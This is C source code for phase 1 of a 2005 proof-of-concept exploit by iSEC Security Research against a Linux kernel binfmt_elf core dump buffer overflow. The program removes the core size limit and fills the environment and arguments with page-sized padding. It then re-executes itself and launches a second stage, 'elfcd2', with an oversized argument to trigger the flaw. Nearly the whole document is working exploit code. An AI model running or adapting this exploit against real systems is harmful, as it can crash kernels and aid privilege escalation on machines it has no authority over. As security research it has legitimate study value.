/*
* Linux binfmt_elf core dump buffer overflow
*
* Copyright (c) 2005 iSEC Security Research. All Rights Reserved.
*
* THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED "AS IS"
* AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION
* WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.
*
*/
// phase 1
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>

#include <sys/time.h>
#include <sys/resource.h>

#include <asm/page.h>


static char *env[10], *argv[4];
static char page[PAGE_SIZE];
static char buf[PAGE_SIZE];


void fatal(const char *msg)
{
if(!errno) {
fprintf(stderr, "\nFATAL: %s\n", msg);
}
else {
printf("\n");
perror(msg);
}
fflush(stdout); fflush(stderr);
_exit(129);
}


int main(int ac, char **av)
{
int esp, i, r;
struct rlimit rl;

__asm__("movl %%esp, %0" : : "m"(esp));
printf("\n[+] %s argv_start=%p argv_end=%p ESP: 0x%x", av[0], av[0], 
av[ac-1]+strlen(av[ac-1]), esp);
rl.rlim_cur = RLIM_INFINITY;
rl.rlim_max = RLIM_INFINITY;
r = setrlimit(RLIMIT_CORE, &rl);
if(r) fatal("setrlimit");

memset(env, 0, sizeof(env) );
memset(argv, 0, sizeof(argv) );
memset(page, 'A', sizeof(page) );
page[PAGE_SIZE-1]=0;

// move up env & exec phase 2
if(!strcmp(av[0], "AAAA")) {
printf("\n[+] phase 2, <RET> to crash "); fflush(stdout);
argv[0] = "elfcd2";
argv[1] = page;

// term 0 counts!
memset(buf, 0, sizeof(buf) );
for(i=0; i<789 + 4; i++)
buf[i] = 'C';
argv[2] = buf;
execve(argv[0], argv, env);
_exit(127);
}

// move down env & reexec
for(i=0; i<9; i++)
env[i] = page;

argv[0] = "AAAA";
printf("\n[+] phase 1"); fflush(stdout);
execve(av[0], argv, env);

return 0;
}